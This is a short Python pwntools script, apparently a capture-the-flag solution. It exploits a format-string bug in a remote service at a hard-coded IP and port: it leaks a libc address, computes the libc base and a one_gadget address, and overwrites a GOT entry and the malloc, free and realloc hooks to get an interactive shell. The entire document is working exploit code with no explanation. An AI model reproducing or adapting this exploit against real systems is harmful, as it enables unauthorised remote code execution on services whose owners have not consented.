#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

libc = ELF('./libc-2.27.so')

p = remote('138.68.96.149', 9054)
#p = remote('172.17.0.2',9054)
p.sendline('%4$p||||'+fmtstr_payload(7,{0x403168:0x401070},numbwritten=18,write_size='byte'))
p.recvuntil('0x')
leak = p.recvuntil('||||')
leak = int(leak[:-4], 16)
libc.address = leak-0x3ed8c0
log.info('Libc found at: '+hex(libc.address))
log.info('one_gadget at: '+hex(libc.address+0x10a38c))
p.sendline(fmtstr_payload(6, {libc.symbols['__malloc_hook']: 0x0000000000301071, libc.symbols['__free_hook']: 0x0000000000401070, libc.symbols['__realloc_hook']: 0x414141414141 ,0x403378: libc.address+0x10a38c}, write_size='byte'))	
p.recvline()
p.interactive()
